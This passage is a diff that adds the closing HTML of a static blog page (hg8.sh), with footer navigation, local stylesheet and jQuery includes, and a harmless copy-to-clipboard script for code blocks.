+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
